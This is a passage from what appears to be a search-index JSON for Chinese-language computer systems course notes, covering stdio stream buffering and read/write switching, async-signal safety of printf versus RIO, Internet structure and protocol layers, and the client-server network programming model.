\u200b\u8f93\u51fa\u200b\u51fd\u6570\u200b\u4f1a\u200b\u5c06\u200b\u8f93\u5165\u200b\u51fd\u6570\u200b\u672a\u8bfb\u200b\u7684\u200b\u90e8\u5206\u200b\u4e5f\u200b\u6253\u5370\u200b\u51fa\u6765\u200b</p> <p>\u200b\u5148\u5199\u200b\u540e\u200b\u8bfb\u200b, \u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u5237\u65b0\u200b\u7f13\u5b58\u200b\u533a\u200b, \u200b\u8bfb\u5165\u200b\u4f1a\u200b\u8bfb\u5165\u200b\u5199\u200b\u5230\u200b\u7f13\u5b58\u200b\u533a\u200b\u7684\u200b\u5185\u5bb9\u200b</p> <p>From Gemini</p> <p>\u200b\u65e2\u7136\u200b\u8bfb\u200b\u548c\u200b\u5199\u200b\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u4e3a\u4ec0\u4e48\u200b Standard I/O (stdio) \u200b\u4e0d\u200b\u8981\u6c42\u200b\u60a8\u200b\u4e3a\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u6253\u5f00\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u6d41\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e3a\u200b\u5199\u200b\u64cd\u4f5c\u200b\u6253\u5f00\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u6d41\u200b\uff0c\u200b\u800c\u662f\u200b\u5141\u8bb8\u200b\u60a8\u200b\u4f7f\u7528\u200b\u50cf\u200b <code>r+</code> \u200b\u8fd9\u6837\u200b\u7684\u200b\u6a21\u5f0f\u200b\u5171\u7528\u200b\u4e00\u4e2a\u200b\u6d41\u200b\u3002</p> <p>\u200b\u8fd9\u79cd\u200b\u8bbe\u8ba1\u200b\u80cc\u540e\u200b\u662f\u200b\u6548\u7387\u200b\u3001\u200b\u65b9\u4fbf\u6027\u200b\u548c\u200b\u539f\u5b50\u200b\u6027\u200b\u7684\u200b\u6743\u8861\u200b\u3002</p>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/#1","title":"1. \u2699\ufe0f \u200b\u6548\u7387\u200b\u548c\u200b\u65b9\u4fbf\u6027\u200b\uff1a\u200b\u907f\u514d\u200b\u4e0d\u5fc5\u8981\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528","text":"<ul> <li> <p>\u200b\u5355\u4e00\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b\uff1a \u200b\u5728\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7684\u200b\u5e95\u5c42\u200b\uff0c\u200b\u65e0\u8bba\u662f\u200b\u8bfb\u200b\u8fd8\u662f\u200b\u5199\u200b\uff0c\u200b\u5171\u7528\u200b\u4e00\u4e2a\u200b\u6d41\u200b\u610f\u5473\u7740\u200b\u53ea\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b (FD)\u3002</p> </li> <li> <p>\u200b\u6587\u4ef6\u200b\u6307\u9488\u200b\u5171\u4eab\u200b\uff1a \u200b\u8bfb\u5199\u200b\u5171\u7528\u200b\u4e00\u4e2a\u200b\u6d41\u200b\u65f6\u200b\uff0c\u200b\u5b83\u4eec\u200b\u5171\u4eab\u200b\u540c\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u6307\u9488\u200b (File Position Indicator)\u3002\u200b\u8fd9\u200b\u5728\u200b\u9700\u8981\u200b\u9891\u7e41\u200b\u5207\u6362\u200b\u8bfb\u5199\u200b\u65b9\u5411\u200b\u7684\u200b\u5e94\u7528\u200b\u4e2d\u200b\u975e\u5e38\u200b\u9ad8\u6548\u200b\uff1a</p> <ul> <li> <p>\u200b\u573a\u666f\u200b\uff1a \u200b\u6570\u636e\u5e93\u200b\u6216\u200b\u7d22\u5f15\u200b\u6587\u4ef6\u200b\u3002\u200b\u60a8\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u5148\u200b\u8bfb\u53d6\u200b\u6587\u4ef6\u200b\u5934\u90e8\u200b\uff08\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff09\uff0c\u200b\u7136\u540e\u200b\u79fb\u52a8\u200b\u6587\u4ef6\u200b\u6307\u9488\u200b\u5230\u200b\u67d0\u4e2a\u200b\u7279\u5b9a\u200b\u4f4d\u7f6e\u200b\uff08<code>fseek</code>\uff09\uff0c\u200b\u518d\u200b\u66f4\u65b0\u200b\u8be5\u200b\u4f4d\u7f6e\u200b\u7684\u200b\u6570\u636e\u200b\uff08\u200b\u5199\u200b\u64cd\u4f5c\u200b\uff09\uff0c\u200b\u7136\u540e\u200b\u7acb\u5373\u200b\u518d\u200b\u8bfb\u53d6\u200b\u9644\u8fd1\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> </li> <li> <p>\u200b\u4f18\u52bf\u200b\uff1a \u200b\u5982\u679c\u200b\u60a8\u200b\u5fc5\u987b\u200b\u521b\u5efa\u200b\u4e24\u4e2a\u200b\u6d41\u200b\uff0c\u200b\u6bcf\u6b21\u200b\u5207\u6362\u200b\u8bfb\u5199\u200b\u65f6\u200b\uff0c\u200b\u60a8\u200b\u9700\u8981\u200b\u534f\u8c03\u200b\u548c\u200b\u540c\u6b65\u200b\u4e24\u4e2a\u200b\u72ec\u7acb\u200b\u6587\u4ef6\u200b\u6d41\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u8fd9\u4f1a\u200b\u590d\u6742\u5316\u200b\u7f16\u7a0b\u200b\uff0c\u200b\u5e76\u200b\u53ef\u80fd\u200b\u589e\u52a0\u200b\u7cfb\u7edf\u200b\u5f00\u9500\u200b\u3002\u200b\u5171\u7528\u200b\u4e00\u4e2a\u200b\u6d41\u200b\u786e\u4fdd\u200b\u4e86\u200b\u8bfb\u5199\u64cd\u4f5c\u200b\u59cb\u7ec8\u200b\u4f5c\u7528\u200b\u4e8e\u200b\u6587\u4ef6\u200b\u7684\u200b\u540c\u4e00\u4e2a\u200b\u7cbe\u786e\u200b\u4f4d\u7f6e\u200b\u3002</p> </li> </ul> </li> </ul>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/#2","title":"2. \ud83d\udee1\ufe0f \u200b\u7b80\u5316\u200b\u5e76\u53d1\u200b\u63a7\u5236\u200b (\u200b\u539f\u5b50\u200b\u6027\u200b)","text":"<p>\u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b\u8fdb\u7a0b\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u6253\u5f00\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u72ec\u7acb\u200b\u7684\u200b\u6d41\u200b\uff08\u200b\u4e00\u4e2a\u200b\u8bfb\u6d41\u200b\u3001\u200b\u4e00\u4e2a\u200b\u5199\u6d41\u200b\uff09\uff0c\u200b\u90a3\u4e48\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5185\u6838\u200b\u5c31\u200b\u5fc5\u987b\u200b\u786e\u4fdd\u200b\u5bf9\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u6d41\u200b\u7684\u200b\u64cd\u4f5c\u200b\u4e0d\u4f1a\u200b\u4e92\u76f8\u200b\u5e72\u6270\u200b\uff0c\u200b\u8fd9\u200b\u5f15\u5165\u200b\u4e86\u200b\u590d\u6742\u200b\u7684\u200b\u540c\u6b65\u200b\u95ee\u9898\u200b\u3002</p> <ul> <li>\u200b\u5355\u4e00\u200b\u9501\u200b\u673a\u5236\u200b\uff1a \u200b\u5f53\u200b\u4f7f\u7528\u200b\u4e00\u4e2a\u200b\u5171\u7528\u200b\u6d41\u200b\u65f6\u200b\uff0cstdio \u200b\u5e93\u200b\u53ea\u200b\u9700\u8981\u200b\u7ba1\u7406\u200b\u4e00\u4e2a\u200b\u5185\u90e8\u200b\u7f13\u51b2\u533a\u200b\u548c\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u6307\u9488\u200b\u3002\u200b\u5728\u200b\u8fdb\u884c\u200b\u8bfb\u5199\u200b\u5207\u6362\u200b\u65f6\u200b\u7684\u200b\u5237\u65b0\u200b\u64cd\u4f5c\u200b (<code>fflush</code> \u200b\u6216\u200b <code>fseek</code>) \u200b\u672c\u8d28\u200b\u4e0a\u200b\u5c31\u662f\u200b\u4e00\u79cd\u200b\u540c\u6b65\u200b\u70b9\u200b\uff0c\u200b\u786e\u4fdd\u200b\u4e86\u200b\u64cd\u4f5c\u200b\u7684\u200b\u987a\u5e8f\u200b\u6027\u200b\u548c\u200b\u539f\u5b50\u200b\u6027\u200b\uff0c\u200b\u7b80\u5316\u200b\u4e86\u200b\u5e93\u200b\u5185\u90e8\u200b\u7684\u200b\u590d\u6742\u6027\u200b\u3002</li> </ul>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/#3","title":"3. \u2696\ufe0f \u200b\u6743\u8861\u200b\uff1a\u200b\u8bfb\u5199\u200b\u5207\u6362\u200b\u7684\u200b\u989d\u5916\u200b\u8981\u6c42","text":"<p>\u200b\u6b63\u662f\u200b\u56e0\u4e3a\u200b\u5171\u7528\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6d41\u200b\uff0c\u200b\u624d\u200b\u9700\u8981\u200b\u5f15\u5165\u200b\u6211\u4eec\u200b\u4e4b\u524d\u200b\u8ba8\u8bba\u200b\u7684\u200b\u7ea6\u675f\u200b\uff1a</p> <ul> <li> <p>\u200b\u7ea6\u675f\u200b\uff1a \u200b\u5728\u8bfb\u200b\u64cd\u4f5c\u200b\u548c\u200b\u5199\u200b\u64cd\u4f5c\u200b\u4e4b\u95f4\u200b\u5207\u6362\u200b\u65f6\u200b\uff0c\u200b\u60a8\u200b\u5fc5\u987b\u200b\u8c03\u7528\u200b <code>fflush()</code> \u200b\u6216\u200b <code>fseek()</code> \u200b\u7b49\u200b\u51fd\u6570\u200b\u3002</p> </li> <li> <p>\u200b\u7406\u7531\u200b\uff1a \u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b stdio \u200b\u5e93\u200b\u4e3a\u4e86\u200b\u6548\u7387\u200b\u9ed8\u8ba4\u200b\u542f\u7528\u200b\u4e86\u200b\u5185\u90e8\u200b\u7f13\u51b2\u533a\u200b\u3002\u200b\u5982\u679c\u200b\u4e0d\u200b\u5237\u65b0\u200b\u6216\u91cd\u200b\u5b9a\u4f4d\u200b\u6307\u9488\u200b\uff0c\u200b\u60a8\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u9047\u5230\u200b\u4ee5\u4e0b\u200b\u95ee\u9898\u200b\uff1a</p> <ol> <li> <p>\u200b\u5199\u540e\u200b\u8bfb\u200b\uff1a \u200b\u60a8\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u53ef\u80fd\u200b\u8fd8\u200b\u505c\u7559\u200b\u5728\u200b\u8f93\u51fa\u200b\u7f13\u51b2\u533a\u200b\u4e2d\u200b\uff0c\u200b\u6ca1\u6709\u200b\u771f\u6b63\u200b\u5199\u5165\u200b\u78c1\u76d8\u200b\uff0c\u200b\u6b64\u65f6\u200b\u53bb\u200b\u8bfb\u53d6\u200b\u6587\u4ef6\u200b\uff0c\u200b\u5c31\u4f1a\u8bfb\u200b\u4e0d\u5230\u200b\u521a\u521a\u200b\u5199\u5165\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p> </li> <li> <p>\u200b\u8bfb\u540e\u200b\u5199\u200b\uff1a \u200b\u60a8\u200b\u8bfb\u53d6\u200b\u6587\u4ef6\u200b\u540e\u200b\uff0c\u200b\u8f93\u5165\u200b\u7f13\u51b2\u533a\u200b\u4e2d\u200b\u53ef\u80fd\u200b\u8fd8\u6709\u200b\u591a\u4f59\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u6b64\u65f6\u200b\u76f4\u63a5\u200b\u5199\u5165\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u7834\u574f\u200b\u6587\u4ef6\u200b\u6307\u9488\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u6216\u200b\u5bfc\u81f4\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u88ab\u200b\u9519\u8bef\u200b\u5730\u200b\u8986\u76d6\u200b\u3002</p> </li> </ol> </li> </ul> <p></p> <ul> <li> \u200b\u4e3a\u4ec0\u4e48\u200b Standard I/O \u200b\u4e0d\u662f\u200b\u5f02\u6b65\u200b\u4fe1\u53f7\u200b\u5b89\u5168\u200b, RIO \u200b\u662f\u200b\u5f02\u6b65\u200b\u4fe1\u53f7\u200b\u5b89\u5168\u200b? <p>Note</p> <p>Standard I/O \u200b\u7684\u200b printf \u200b\u51fd\u6570\u200b\u5171\u7528\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u533a\u200b, \u200b\u5728\u200b\u6267\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\u4f1a\u200b\u52a0\u9501\u200b\u907f\u514d\u200b\u7f13\u5b58\u200b\u533a\u200b\u88ab\u200b\u5176\u4ed6\u200b\u7684\u200b\u51fd\u6570\u200b\u66f4\u6539\u200b. \u200b\u5982\u679c\u200b\u52a0\u9501\u200b\u540e\u200b\u7acb\u523b\u200b\u88ab\u200b\u4fe1\u53f7\u5904\u7406\u200b\u7a0b\u5e8f\u200b\u4e2d\u65ad\u200b, \u200b\u4e14\u200b\u4fe1\u53f7\u5904\u7406\u200b\u7a0b\u5e8f\u200b\u4e2d\u200b\u53c8\u200b\u4f7f\u7528\u200b\u4e86\u200b\u4e00\u6b21\u200b printf, \u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b printf \u200b\u5c31\u200b\u4f1a\u200b\u9677\u5165\u200b\u6b7b\u9501\u200b\u72b6\u6001\u200b(\u200b\u524d\u200b\u4e00\u4e2a\u200b\u8fd8\u200b\u6ca1\u200b\u89e3\u9501\u200b)</p> <p>RIO \u200b\u6ca1\u6709\u200b\u9501\u200b\u7684\u200b\u673a\u5236\u200b, \u200b\u5982\u679c\u200b\u7a0b\u5e8f\u200b\u548c\u200b\u4fe1\u53f7\u5904\u7406\u200b\u7a0b\u5e8f\u200b\u7684\u200b buffer read \u200b\u6307\u5411\u200b\u540c\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u533a\u4f1a\u200b\u53d1\u751f\u200b\u4ea4\u53c9\u200b\u8bfb\u5165\u200b\u73b0\u8c61\u200b.</p> </li> </ul>"},{"location":"notes/ICS/Chapter%2011.A%20Network%20%28Additional%20Content%29/","title":"Chapter 11.A Network (Additional Content)","text":""},{"location":"notes/ICS/Chapter%2011.A%20Network%20%28Additional%20Content%29/#1-what-is-the-internet-what-is-a-protocol","title":"1. What is the Internet? What is a protocol?","text":"<p>Q1. What's included in a society?</p> <ul> <li>People, entities -&gt; internet components</li> <li>Services -&gt; internet services</li> <li>Laws and rules -&gt; protocols, standards</li> </ul>"},{"location":"notes/ICS/Chapter%2011.A%20Network%20%28Additional%20Content%29/#11-the-internet-a-nuts-and-bolts-view","title":"1.1 The Internet: a \"nuts and bolts\" view","text":"<p>Billions of connected computing devices:</p> <ul> <li>hosts (\u200b\u4e3b\u673a\u200b) = end systems</li> <li>running network apps at Internet's \"edge\"</li> </ul> <p>Packet switches (\u200b\u6570\u636e\u5305\u200b\u4ea4\u6362\u673a\u200b): forward packets (chunks of data) - routers (\u200b\u8def\u7531\u5668\u200b), switches (\u200b\u4ea4\u6362\u673a\u200b)</p> <p>Communication links </p> <ul> <li>fiber, copper, radio, satellite</li> <li>transmission rate: bandwidth (\u200b\u5e26\u5bbd\u200b)</li> </ul> <p>Networks</p> <ul> <li>collection of devices, routers, links: managed by an organization</li> </ul> <p></p> <p>Internet: \"network of networks\"</p> <ul> <li>Interconnected ISPs</li> </ul> <p>Protocols are everywhere</p> <ul> <li>control sending, receiving of messages</li> <li>e.g., HTTP(Web), streaming video, Skype(\u200b\u7f51\u7edc\u200b\u901a\u8bdd\u200b), TCP, IP, WiFi, 4/5G, Ethernet</li> </ul> <p>Internet standards</p> <ul> <li>RFC: Request for Comments</li> <li>IETF: Internet Engineering Task Force</li> </ul> <p></p>"},{"location":"notes/ICS/Chapter%2011.A%20Network%20%28Additional%20Content%29/#12-the-internet-a-services-view","title":"1.2 The Internet: a \"services\" view","text":""},{"location":"notes/ICS/Chapter%2011.A%20Network%20%28Additional%20Content%29/#13-protocol","title":"1.3 Protocol","text":"<p>Protocols define the format, order of messages sent and received among network entities, and actions taken on message transmission, receipt.</p>"},{"location":"notes/ICS/Chapter%2011.A%20Network%20%28Additional%20Content%29/#2-network-edge-hosts-access-network-physical-media","title":"2. Network edge: hosts, access network, physical media","text":""},{"location":"notes/ICS/Chapter%2011.A%20Network%20%28Additional%20Content%29/#21-a-closer-look-at-internet-structure","title":"2.1 A closer look at Internet structure","text":""},{"location":"notes/ICS/Chapter%2011.A%20Network%20%28Additional%20Content%29/#1-network-edge","title":"1. \u200b\u7f51\u7edc\u200b\u8fb9\u7f18\u200b (Network edge)","text":"<ul> <li> <p>\u200b\u5b9a\u4e49\u200b\uff1a \u200b\u6570\u636e\u200b\u7684\u200b\u8d77\u70b9\u200b\u548c\u200b\u7ec8\u70b9\u200b\uff0c\u200b\u662f\u200b\u8fde\u63a5\u200b\u5230\u200b\u4e92\u8054\u7f51\u200b\u672b\u7aef\u200b\u7684\u200b\u8bbe\u5907\u200b\u3002</p> </li> <li> <p>\u200b\u7ec4\u6210\u200b\uff1a \u200b\u5305\u62ec\u200b \u200b\u4e3b\u673a\u200b (hosts)\uff0c\u200b\u5373\u200b \u200b\u5ba2\u6237\u7aef\u200b (clients)\uff08\u200b\u5982\u200b\u60a8\u200b\u7684\u200b\u7b14\u8bb0\u672c\u7535\u8111\u200b\u3001\u200b\u624b\u673a\u200b\uff09\u200b\u548c\u200b \u200b\u670d\u52a1\u5668\u200b (servers)\uff08\u200b\u901a\u5e38\u200b\u5728\u200b\u6570\u636e\u4e2d\u5fc3\u200b\uff09\u3002</p> </li> <li> <p>\u200b\u4f5c\u7528\u200b\uff1a \u200b\u4ea7\u751f\u200b\u6216\u200b\u63a5\u6536\u6570\u636e\u200b\u3002</p> </li> </ul>"},{"location":"notes/ICS/Chapter%2011.A%20Network%20%28Additional%20Content%29/#2-access-networks-physical-media","title":"2. \u200b\u63a5\u5165\u200b\u7f51\u7edc\u200b\u548c\u200b\u7269\u7406\u200b\u5a92\u4f53\u200b (Access networks, physical media)","text":"<ul> <li> <p>\u200b\u5b9a\u4e49\u200b\uff1a \u200b\u5141\u8bb8\u200b\u7f51\u7edc\u200b\u8fb9\u7f18\u200b\u8bbe\u5907\u200b\uff08\u200b\u4e3b\u673a\u200b\uff09\u200b\u8fde\u63a5\u200b\u5230\u200b\u4e92\u8054\u7f51\u200b\u6838\u5fc3\u200b\u7684\u200b\u7269\u7406\u200b\u94fe\u8def\u200b\u3002</p> </li> <li> <p>\u200b\u7ec4\u6210\u200b\uff1a \u200b\u5305\u62ec\u200b\u6709\u7ebf\u200b (wired) \u200b\u548c\u200b\u65e0\u7ebf\u200b (wireless) \u200b\u901a\u4fe1\u200b\u94fe\u8def\u200b\u3002</p> </li> <li> <p>\u200b\u4f5c\u7528\u200b\uff1a \u200b\u5c06\u200b\u8fb9\u7f18\u200b\u8bbe\u5907\u200b\u8fde\u63a5\u200b\u5230\u200b\u5b83\u4eec\u200b\u6700\u8fd1\u200b\u7684\u200b\u8def\u7531\u5668\u200b\uff0c\u200b\u662f\u200b\u6570\u636e\u200b\u8fdb\u5165\u200b\u4e92\u8054\u7f51\u200b\u7684\u200b\u7b2c\u4e00\u6b65\u200b\u3002</p> </li> </ul>"},{"location":"notes/ICS/Chapter%2011.A%20Network%20%28Additional%20Content%29/#3-network-core","title":"3. \u200b\u7f51\u7edc\u200b\u6838\u5fc3\u200b (Network core)","text":"<ul> <li> <p>\u200b\u5b9a\u4e49\u200b\uff1a \u200b\u4e92\u8054\u7f51\u200b\u7684\u200b\u9aa8\u5e72\u200b\u7f51\u7edc\u200b\uff0c\u200b\u8d1f\u8d23\u200b\u5728\u200b\u4e0d\u540c\u200b\u7f51\u7edc\u200b\u4e4b\u95f4\u200b\u8f6c\u53d1\u200b\u6570\u636e\u200b\u3002</p> </li> <li> <p>\u200b\u7ec4\u6210\u200b\uff1a \u200b\u7531\u200b\u4e92\u8fde\u200b\u7684\u200b\u8def\u7531\u5668\u200b (interconnected routers) \u200b\u6784\u6210\u200b\uff0c\u200b\u901a\u5e38\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u4e00\u4e2a\u200b\u7f51\u7edc\u200b\u7684\u200b\u7f51\u7edc\u200b (network of networks)\u3002</p> </li> <li> <p>\u200b\u4f5c\u7528\u200b\uff1a \u200b\u63a5\u6536\u200b\u6765\u81ea\u200b\u63a5\u5165\u200b\u7f51\u7edc\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5e76\u200b\u901a\u8fc7\u200b\u8def\u7531\u5668\u200b\u7684\u200b\u8def\u5f84\u200b\uff0c\u200b\u5c06\u200b\u6570\u636e\u5305\u200b\u4ece\u200b\u6e90\u5934\u200b\u8f6c\u53d1\u200b\u5230\u200b\u76ee\u7684\u5730\u200b\u3002\u200b\u6838\u5fc3\u200b\u7f51\u7edc\u200b\u4e3b\u8981\u200b\u7531\u200b\u4e0d\u540c\u200b\u5c42\u7ea7\u200b\u7684\u200b ISP (Internet Service Provider) \u200b\u6784\u6210\u200b\uff08\u200b\u5982\u56fe\u200b\u4e2d\u200b\u7684\u200b Local/Regional ISP \u200b\u548c\u200b National/Global ISP\uff09\u3002</p> </li> </ul>"},{"location":"notes/ICS/Chapter%2011.A%20Network%20%28Additional%20Content%29/#3-protocol-layers","title":"3. Protocol layers","text":"\u7f16\u53f7\u200b TCP/IP \u200b\u4e94\u5c42\u200b\u540d\u79f0\u200b (\u200b\u4e2d\u6587\u200b) \u200b\u5bf9\u5e94\u200b OSI \u200b\u5c42\u7ea7\u200b \u200b\u4e3b\u8981\u200b\u534f\u8bae\u200b\u53ca\u200b\u529f\u80fd\u200b 5 \u200b\u5e94\u7528\u5c42\u200b 5, 6, 7 \u200b\u5305\u542b\u200b OSI \u200b\u7684\u200b\u4f1a\u200b\u8bdd\u200b\u3001\u200b\u8868\u793a\u200b\u3001\u200b\u5e94\u7528\u5c42\u200b\u529f\u80fd\u200b (HTTP, DNS, SMTP)\u3002 4 \u200b\u4f20\u8f93\u5c42\u200b 4 \u200b\u63d0\u4f9b\u200b\u7aef\u5230\u200b\u7aef\u7684\u200b\u901a\u4fe1\u200b\u548c\u200b\u8fde\u63a5\u200b\u7ba1\u7406\u200b (TCP, UDP)\u3002 3 \u200b\u7f51\u7edc\u5c42\u200b 3 \u200b\u8d1f\u8d23\u200b\u6570\u636e\u5305\u200b\u7684\u200b\u8def\u7531\u200b\u548c\u200b\u903b\u8f91\u200b\u5bfb\u5740\u200b (IP)\u3002 2 \u200b\u94fe\u8def\u5c42\u200b 2 \u200b\u8d1f\u8d23\u200b\u5e27\u200b\u7684\u200b\u4f20\u8f93\u200b\u548c\u200b\u7269\u7406\u200b\u5bfb\u5740\u200b (Ethernet, Wi-Fi, PPP)\u3002 1 \u200b\u7269\u7406\u5c42\u200b 1 \u200b\u8d1f\u8d23\u200b\u6bd4\u7279\u6d41\u200b\u7684\u200b\u7269\u7406\u200b\u4f20\u8f93\u200b\u3002"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/","title":"Chapter 11.B Network Programming","text":""},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#111-","title":"11.1 \u200b\u5ba2\u6237\u7aef\u200b-\u200b\u670d\u52a1\u5668\u200b\u7f16\u7a0b\u200b\u6a21\u578b","text":"<p>\u200b\u6bcf\u4e2a\u200b\u7f51\u7edc\u5e94\u7528\u200b\u90fd\u200b\u662f\u200b\u57fa\u4e8e\u200b \u200b\u5ba2\u6237\u7aef\u200b-\u200b\u670d\u52a1\u5668\u200b\u6a21\u578b\u200b \u200b\u7684\u200b. \u200b\u91c7\u7528\u200b\u8fd9\u4e2a\u200b\u6a21\u578b\u200b, \u200b\u4e00\u4e2a\u200b\u5e94\u7528\u200b\u7531\u200b\u4e00\u4e2a\u200b\u670d\u52a1\u5668\u200b\u8fdb\u7a0b\u200b\u548c\u200b\u4e00\u4e2a\u200b\u6216\u8005\u200b\u591a\u4e2a\u200b\u5ba2\u6237\u7aef\u200b\u8fdb\u7a0b\u200b\u7ec4\u6210\u200b. \u200b\u670d\u52a1\u5668\u200b\u7ba1\u7406\u200b\u67d0\u79cd\u200b\u8d44\u6e90\u200b, \u200b\u5e76\u4e14\u200b\u901a\u8fc7\u200b\u64cd\u4f5c\u200b\u8fd9\u79cd\u200b\u8d44\u6e90\u200b\u4f4d\u200b\u5b83\u200b\u7684\u200b\u5ba2\u6237\u7aef\u200b\u63d0\u4f9b\u200b\u670d\u52a1\u200b.</p> <p>\u200b\u5ba2\u6237\u7aef\u200b-\u200b\u670d\u52a1\u5668\u200b\u6a21\u578b\u200b\u4e2d\u200b\u7684\u200b\u57fa\u672c\u64cd\u4f5c\u200b\u662f\u200b\u4e8b\u52a1\u200b(transaction). \u200b\u4e00\u4e2a\u200b\u4e8b\u52a1\u200b\u7531\u200b\u4ee5\u4e0b\u200b\u56db\u6b65\u200b\u7ec4\u6210\u200b.</p> <ul> <li>\u200b\u4e00\u4e2a\u200b\u5ba2\u6237\u7aef\u200b\u9700\u8981\u200b\u670d\u52a1\u200b\u65f6\u200b, \u200b\u5b83\u200b\u5411\u200b\u670d\u52a1\u5668\u53d1\u9001\u200b\u4e00\u4e2a\u200b\u8bf7\u6c42\u200b.</li> <li>\u200b\u670d\u52a1\u5668\u200b\u6536\u5230\u200b\u8bf7\u6c42\u200b\u540e\u200b, \u200b\u89e3\u91ca\u200b\u5b83\u200b, \u200b\u5e76\u200b\u4ee5\u200b\u9002\u5f53\u200b\u7684\u200b\u65b9\u5f0f\u200b\u64cd\u4f5c\u200b\u4ed6\u200b\u7684\u200b\u8d44\u6e90\u200b</li> <li>\u200b\u670d\u52a1\u5668\u200b\u7ed9\u200b\u5ba2\u6237\u7aef\u200b\u53d1\u9001\u200b\u4e00\u4e2a\u200b\u54cd\u5e94\u200b, \u200b\u5e76\u200b\u7b49\u5f85\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u8bf7\u6c42\u200b.</li> <li>\u200b\u5ba2\u6237\u7aef\u200b\u6536\u5230\u200b\u54cd\u5e94\u200b\u5e76\u200b\u5904\u7406\u200b\u5b83\u200b.</li> </ul> <p></p> <p>\u200b\u4e00\u53f0\u200b\u4e3b\u673a\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u8fd0\u884c\u200b\u8bb8\u591a\u200b\u4e0d\u540c\u200b\u7684\u200b\u5ba2\u6237\u7aef\u200b\u548c\u200b\u670d\u52a1\u5668\u200b, \u200b\u800c\u4e14\u200b\u4e00\u4e2a\u200b\u5ba2\u6237\u7aef\u200b\u548c\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u4e8b\u52a1\u200b\u53ef\u4ee5\u200b\u5728\u200b\u540c\u4e00\u200b\u53f0\u200b\u6216\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\u4e3b\u673a\u200b\u4e0a\u200b. \u200b\u65e0\u8bba\u200b\u5ba2\u6237\u7aef\u200b\u548c\u200b\u670d\u52a1\u5668\u200b\u662f\u200b\u600e\u6837\u200b\u6620\u5c04\u200b\u5230\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u7684\u200b, \u200b\u5ba2\u6237\u7aef\u200b-\u200b\u670d\u52a1\u5668\u200b\u6a21\u578b\u200b\u90fd\u200b\u662f\u200b\u76f8\u540c\u200b\u7684\u200b.</p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#112","title":"11.2 \u200b\u7f51\u7edc","text":"<p>\u200b\u5ba2\u6237\u7aef\u200b\u548c\u200b\u670d\u52a1\u5668\u200b\u901a\u5e38\u200b\u8fd0\u884c\u200b\u5728\u200b\u4e0d\u540c\u200b\u7684\u200b\u4e3b\u673a\u200b\u4e0a\u200b, \u200b\u5e76\u4e14\u200b\u901a\u8fc7\u200b\u8ba1\u7b97\u673a\u7f51\u7edc\u200b\u7684\u200b\u786c\u4ef6\u200b\u548c\u200b\u8f6f\u4ef6\u8d44\u6e90\u200b\u6765\u200b\u901a\u4fe1\u200b.</p> <p>\u200b\u5bf9\u200b\u4e3b\u673a\u200b\u800c\u8a00\u200b, \u200b\u7f51\u7edc\u200b\u53ea\u662f\u200b\u53c8\u200b\u4e00\u79cd\u200b I/O \u200b\u8bbe\u5907\u200b, \u200b\u662f\u200b\u6570\u636e\u6e90\u200b\u548c\u200b\u6570\u636e\u200b\u63a5\u6536\u200b\u65b9\u200b. \u200b\u4e00\u4e2a\u200b\u63d2\u200b\u5230\u200b I/O \u200b\u603b\u7ebf\u200b\u6269\u5c55\u69fd\u200b\u7684\u200b\u9002\u914d\u5668\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5230\u200b\u7f51\u7edc\u200b\u7684\u200b\u7269\u7406\u200b\u63a5\u53e3\u200b. \u200b\u4ece\u200b\u7f51\u7edc\u200b\u4e0a\u200b\u63a5\u6536\u200b\u5230\u200b\u7684\u200b\u6570\u636e\u200b\u4ece\u200b\u9002\u914d\u5668\u200b\u7ecf\u8fc7\u200b I/O \u200b\u548c\u200b\u5185\u5b58\u200b\u603b\u7ebf\u200b\u590d\u5236\u5230\u200b\u5185\u5b58\u200b, \u200b\u901a\u5e38\u200b\u662f\u200b\u901a\u8fc7\u200b 